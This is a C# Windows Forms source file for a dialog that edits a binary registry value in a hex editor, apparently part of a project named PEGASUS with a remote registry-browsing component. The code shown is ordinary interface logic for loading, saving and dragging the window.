using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using PEGASUS.IcarusWings;
using static PEGASUS.IcarusWings.RegistrySeeker;

namespace PEGASUS.Design
{
    public partial class FormRegValueEditBinary : Form
    {
        private const string INVALID_BINARY_ERROR =
            "The binary value was invalid and could not be converted correctly.";

        private readonly RegValueData _value;


        public FormRegValueEditBinary(RegValueData value)
        {
            _value = value;

            InitializeComponent();

            valueNameTxtBox.Text = RegValueHelper.GetName(value.Name);
            hexEditor.HexTable = value.Data;
        }

        private void okButton_Click(object sender, EventArgs e)
        {
            var bytes = hexEditor.HexTable;
            if (bytes != null)
                try
                {
                    _value.Data = bytes;
                    DialogResult = DialogResult.OK;
                    Tag = _value;
                }
                catch
                {
                    ShowWarning(INVALID_BINARY_ERROR, "Warning");
                    DialogResult = DialogResult.None;
                }

            Close();
        }

        private void ShowWarning(string msg, string caption)
        {
            MessageBox.Show(msg, caption, MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }


        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }
    }
}